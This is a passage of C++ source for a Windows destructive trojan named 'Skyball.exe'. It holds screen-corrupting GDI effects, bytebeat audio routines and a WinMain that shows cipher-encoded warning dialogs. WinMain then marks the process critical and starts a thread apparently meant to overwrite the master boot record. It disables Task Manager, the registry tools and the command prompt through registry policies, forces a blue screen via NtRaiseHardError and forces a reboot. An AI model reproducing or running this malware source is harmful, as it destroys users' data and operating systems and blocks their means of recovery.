			int wave = tan(i / ((float)xSize) * M_PI) * (ySize);
			BitBlt(hdcMem, i, 0, 1, sh, hdcMem, i, wave, SRCPAINT);
			BitBlt(hdcMem, 0, i, sw, 1, hdcMem, wave, i, NOTSRCCOPY);
		}
		BitBlt(hdc, 0, 0, sw, sh, hdcMem, 0, 0, SRCCOPY);
		Sleep(1);
		ReleaseDC(0, hdc);
		DeleteDC(hdc); DeleteDC(hdcMem); DeleteObject(screenshot);
	}
}

DWORD WINAPI noskid92(LPVOID lpParam) {
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		int rndrgb = RGB(rand() % 1000, rand() % 1000, rand() % 1000);
		BITMAPINFO bmi = { 0 };
		PRGBQUAD rgbScreen = { 0 };
		bmi.bmiHeader = { sizeof(BITMAPINFOHEADER), w, h, 1, 32, BI_RGB };
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmi, NULL, (void**)&rgbScreen, NULL, NULL);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		for (int i = 0; i < w * h; i++) {
			int x = i % w, y = i / w;
			rgbScreen[i].rgb += (rgbScreen[i].rgb + rand() % int(cbrt(i + (x * y) + 11))) % (rndrgb);
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, NOTSRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
	}
}

DWORD WINAPI noskid10(LPVOID lpParam)
{
	HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	BITMAPINFO bmi = { 40, sw, sh, 1, 24 };
	PRGBTRIPLE rgbtriple;
	int radius = 8.0f; double angle = 0;
	for (;;) {
		desk = GetDC(0);
		HDC deskMem = CreateCompatibleDC(desk);
		HBITMAP scr = CreateDIBSection(desk, &bmi, 0, (void**)&rgbtriple, 0, 0);
		SelectObject(deskMem, scr);
		BitBlt(deskMem, 0, 0, sw, sh, desk, 0, 0, SRCCOPY);
		for (int i = 0; i < sw * sh; i++) {
			int x = i % sw, y = i / sh, t = y ^ y | x;
			rgbtriple[i].rgbtRed += GetRValue(x ^ y);
			rgbtriple[i].rgbtGreen += GetGValue(x | y);
			rgbtriple[i].rgbtBlue += GetBValue(x & y);
		}
		float x = cos(angle) * radius, y = tan(angle) * radius;
		BitBlt(desk, 0, 0, sw, sh, deskMem, x, y, SRCCOPY);
		ReleaseDC(wnd, desk);
		DeleteDC(desk); DeleteDC(deskMem); DeleteObject(scr); DeleteObject(wnd); DeleteObject(rgbtriple); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&bmi);
		angle = fmod(angle + M_PI / radius, M_PI * radius);
	}
}

DWORD WINAPI noskid11(LPVOID lpParam) {
	int i = 0;
	while (true) {
		HDC hdc = GetDC(0);
		HDC hcdc = CreateCompatibleDC(hdc);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);
		BITMAPINFO bmpi = { 0 }; bmpi.bmiHeader = { sizeof(bmpi), w, h, 1, 32, BI_RGB };
		RGBQUAD* rgbquad = NULL;
		HSL hslcolor;
		HBITMAP hBitmap = CreateDIBSection(hdc, &bmpi, DIB_RGB_COLORS, (void**)&rgbquad, NULL, 0);
		SelectObject(hcdc, hBitmap);
		BitBlt(hcdc, 0, 0, w, h, hdc, 0, 0, SRCCOPY);
		RGBQUAD rgbquadCopy;
		for (int x = 0; x < w; x++) {
			for (int y = 0; y < h; y++) {
				int index = y * x + w;
				int fx = (int)((11 ^ i) + ((11 - i) * sqrt(x - 15)) + (9 * i) + ((6 * i) * sin(y + 44)));
				rgbquad[index].rgbRed += fx;
				rgbquad[index].rgbGreen -= fx;
				rgbquad[index].rgbBlue += fx;
			}
		}
		BitBlt(hdc, 0, 0, w, h, hcdc, 0, 0, SRCERASE);
		ReleaseDC(0, hdc); ReleaseDC(0, hcdc);
		DeleteObject(hBitmap);
		DeleteDC(hcdc); DeleteDC(hdc);
		i++;
	}
}

DWORD WINAPI noskid111(LPVOID lpParam) {
	while (1) {
		HDC hdc = GetDC(0);
		int w = GetSystemMetrics(0);
		int h = GetSystemMetrics(1);

		// Increase the random displacements to intensify the shake effect
		int shakeIntensity = 10; // This is the increased intensity

								// BitBlt with random offsets, now within the range of -5 to +5
		BitBlt(hdc, rand() % (shakeIntensity * 2) - shakeIntensity, rand() % (shakeIntensity * 2) - shakeIntensity,
			w, h, hdc, rand() % (shakeIntensity * 2) - shakeIntensity, rand() % (shakeIntensity * 2) - shakeIntensity, SRCCOPY);

		Sleep(10);  // Delay between shake movements
		ReleaseDC(0, hdc);
	}
	return 0x00;
}


VOID WINAPI bytebeat1() {//ksdcbrctys.exe like
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * 2 >> (t * "7891pm"[t >> 12 & 2] * (t >> 9 | 9) >> 4) ^ (t | 1)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat2() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((78 * t | (t >> 91) + (91 - (t >> 13 & 13)) * t >> (t >> 78) ^ (t << 91)));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat3() {
	int nSamplesPerSec = 12345, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t >> 78 | t >> 91) & 46 & t >> 78 ^ (t & t >> 13 | t >> 6) & t) * t);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat4() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan(13) + ((t & 91) * (t >> 7) ^ t & t >> 8) / 2);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat5() {
	int nSamplesPerSec = 11025, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(((t + (t ^ (t & t * (t >> 9 | 9) << 1) | (7891 + t)) ^ (t + 1)) / ((4 ^ t >> 12) + 1) & 6765));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat6() {
	int nSamplesPerSec = 22050, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * t >> t + t | t * t & t ^ t / (t + 1) | (3 * t) - t));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

VOID WINAPI bytebeat7() {
	int nSamplesPerSec = 10000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(tan((t | (t >> 9 | t >> 7)) * t & (t >> 11 | t >> 9)) * 129);
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat8() {//neurozine.exe like
	int nSamplesPerSec = 11000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((((t & t >> 8) | (t & t >> 5) & (t ^ t << 4) + (t * t >> 7)) & 675));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat9() {//by the no skid
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (0x9178ACCEED >> (t >> 8 & 31)) | t % 39 | t >> 8) + (t & 6765));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}
VOID WINAPI bytebeat10() {
	int nSamplesPerSec = 4000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)(t * (42 & t >> 8) | (t * (42 & t >> 8) / 8 & 255));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

VOID WINAPI bytebeat11() {
	int nSamplesPerSec = 8000, nSampleCount = nSamplesPerSec * 30;
	HANDLE hHeap = GetProcessHeap();
	PSHORT psSamples = (PSHORT)HeapAlloc(hHeap, 0, nSampleCount);
	WAVEFORMATEX waveFormat = { WAVE_FORMAT_PCM, 1, nSamplesPerSec, nSamplesPerSec, 1, 8, 0 };
	WAVEHDR waveHdr = { (PCHAR)psSamples, nSampleCount, 0, 0, 0, 0, NULL, 0 };
	HWAVEOUT hWaveOut;
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &waveFormat, 0, 0, 0);
	for (INT t = 0; t < nSampleCount; t++) {
		BYTE bFreq = (BYTE)((t * (t & 16384 ? 6 : 5) * (1 + (1 & t >> 1)) >> (1 & t >> 1)) | ((t * (t & 16384 ? 6 : 5) * (4 - (1 & t >> 8)) >> (3 & t >> 9)) | t >> 6) + ((t * t >> 8) / 4));
		((BYTE*)psSamples)[t] = bFreq;
	}
	waveOutPrepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	waveOutWrite(hWaveOut, &waveHdr, sizeof(waveHdr));
	Sleep(nSampleCount * 1000 / nSamplesPerSec);
	while (!(waveHdr.dwFlags & WHDR_DONE)) {
		Sleep(1);
	}
	waveOutReset(hWaveOut);
	waveOutUnprepareHeader(hWaveOut, &waveHdr, sizeof(waveHdr));
	HeapFree(hHeap, 0, psSamples);
}

int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
	InitDPI();
	srand(time(NULL));
	SeedXorshift32((DWORD)time(NULL));
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	CREATE_NO_WINDOW;
	HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	if (MessageBoxW(NULL, L"Dhyupun! Fvb ohcl yhu h ayvqhu ruvdu hz Skyball aoha ohz mbss jhwhjpaf av klslal hss vm fvby khah huk fvby vwlyhapun zfzalt. If jvuapubpun, fvb rllw pu tpuk aoha aol jylhavy (Underwater Tiny Kong, MSAgentRocks324's Imposter & Flippy's World) dpss uva il ylzwvuzpisl mvy huf khthnl jhbzlk if aopz ayvqhu huk pa'z opnosf yljvttluklk aoha fvb ybu aopz pu h alzapun cpyabhs thjopul dolyl h zuhwzova ohz illu thkl ilmvyl leljbapvu mvy aol zhrl vm lualyahputlua huk huhsfzpz. Hyl fvb zbyl fvb dhua av ybu aopz?", L"Skyball.exe (No Skid)", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
	{
		UnhookWindowsHookEx(hMsgHookA);
		ExitProcess(0);
	}
	else
	{
		CREATE_NO_WINDOW;
		HHOOK hMsgHookA = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
		if (MessageBoxW(NULL, L"Mpuhs dhyupun! Aopz ayvqhu ohz h sva vm klzaybjapcl wvaluaphs. Fvb dpss svzl hss vm fvby khah pm fvb jvuapubl huk aol jylhavy (Underwater Tiny Kong, MSAgentRocks324's Imposter & Flippy's World) dpss uva il ylzwvuzpisl mvy huf vm aol khthnl jhbzlk. Aopz pz uva tlhua av il thspjpvbz, iba zptwsf mvy lualyahputlua huk lkbjhapvuhs wbywvzlz. Hyl fvb zbyl fvb dhua av jvuapubl? Aopz pz fvby mpuhs johujl av zavw aopz wyvnyht myvt leljbapvu.", L"Skyball.exe (No Skid)", MB_YESNO | MB_ICONEXCLAMATION | MB_SYSTEMMODAL) == IDNO)
		{
			UnhookWindowsHookEx(hMsgHookA);
			ExitProcess(0);
		}
		else
		{
			ProcessIsCritical();
			HANDLE Overwrite = CreateThread(0, 0, mbr, 0, 0, 0);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskMgr", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
			RegAdd(HKEY_CURRENT_USER, L"SOFTWARE\\Policies\\Microsoft\\Windows\\System", L"DisableCMD", REG_DWORD, 2);
			Sleep(1000);
			HANDLE good = CreateThread(0, 0, noskidball, 0, 0, 0);
			Sleep(4000);
			HANDLE P1 = CreateThread(0, 0, noskid1, 0, 0, 0);
			HANDLE P1dot1 = CreateThread(0, 0, noskid1d1, 0, 0, 0);
			bytebeat1();
			TerminateThread(P1, 0);
			CloseHandle(P1);
			TerminateThread(P1dot1, 0);
			CloseHandle(P1dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P2 = CreateThread(0, 0, noskid2, 0, 0, 0);
			bytebeat2();
			TerminateThread(P2, 0);
			CloseHandle(P2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P3 = CreateThread(0, 0, noskid3, 0, 0, 0);
			bytebeat3();
			TerminateThread(P3, 0);
			CloseHandle(P3);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P4 = CreateThread(0, 0, noskid4, 0, 0, 0);
			bytebeat4();
			TerminateThread(P4, 0);
			CloseHandle(P4);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P5 = CreateThread(0, 0, noskid5, 0, 0, 0);
			HANDLE P5dot1 = CreateThread(0, 0, noskidheadshot, 0, 0, 0);
			bytebeat5();
			TerminateThread(P5, 0);
			CloseHandle(P5);
			TerminateThread(P5dot1, 0);
			CloseHandle(P5dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P6 = CreateThread(0, 0, noskid6, 0, 0, 0);
			bytebeat6();
			TerminateThread(P6, 0);
			CloseHandle(P6);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P7 = CreateThread(0, 0, noskid7, 0, 0, 0);
			HANDLE P7dot1 = CreateThread(0, 0, noskidheadshot, 0, 0, 0);
			bytebeat7();
			TerminateThread(P7, 0);
			CloseHandle(P7);
			TerminateThread(P7dot1, 0);
			CloseHandle(P7dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P8 = CreateThread(0, 0, noskid8, 0, 0, 0);
			HANDLE P8dot1 = CreateThread(0, 0, noskid81, 0, 0, 0);
			bytebeat8();
			TerminateThread(P8, 0);
			CloseHandle(P8);
			TerminateThread(P8dot1, 0);
			CloseHandle(P8dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P9 = CreateThread(0, 0, noskid9, 0, 0, 0);
			HANDLE P9dot1 = CreateThread(0, 0, noskid91, 0, 0, 0);
			HANDLE P9dot2 = CreateThread(0, 0, noskid92, 0, 0, 0);
			bytebeat9();
			TerminateThread(P9, 0);
			CloseHandle(P9);
			TerminateThread(P9dot1, 0);
			CloseHandle(P9dot1);
			TerminateThread(P9dot2, 0);
			CloseHandle(P9dot2);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			HANDLE P10 = CreateThread(0, 0, noskid10, 0, 0, 0);
			HANDLE P10dot1 = CreateThread(0, 0, noskidheadshot, 0, 0, 0);
			bytebeat10();
			TerminateThread(P10, 0);
			CloseHandle(P10);
			TerminateThread(P10dot1, 0);
			CloseHandle(P10dot1);
			InvalidateRect(0, 0, 0);
			HANDLE P11 = CreateThread(0, 0, noskid11, 0, 0, 0);
			HANDLE P11dot1 = CreateThread(0, 0, noskid111, 0, 0, 0);
			bytebeat11();
			TerminateThread(P11, 0);
			CloseHandle(P11);
			TerminateThread(P11dot1, 0);
			CloseHandle(P11dot1);
			InvalidateRect(0, 0, 0);
			Sleep(100);
			BOOLEAN bl;
			DWORD response;
			NRHEdef NtRaiseHardError = (NRHEdef)GetProcAddress(LoadLibraryW(L"ntdll"), "NtRaiseHardError");
			RAPdef RtlAdjustPrivilege = (RAPdef)GetProcAddress(LoadLibraryW(L"ntdll"), "RtlAdjustPrivilege");
			RtlAdjustPrivilege(19, 1, 0, &bl);
			ULONG_PTR args[] = { (ULONG_PTR)"No More Skidded, Without Stolen GDI & Bytebeat, Hate TrisodiumPhospate, ChirsRM_380, KozaResponding2/Elias201478/x0rUnrespond2, UltraDasher965/ultravoider_x86 & N17Pro3426 NOW!" }; //Custom BSOD yay!
			NtRaiseHardError(0xC0000144, 1, 0, (PULONG)args, 6, &response);
			// If the computer is still running, do it the normal way
			HANDLE token;
			TOKEN_PRIVILEGES privileges;

			OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

			LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
			privileges.PrivilegeCount = 1;
			privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

			AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);

			// The actual restart
			ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
			Sleep(-1);
		}
	}
}
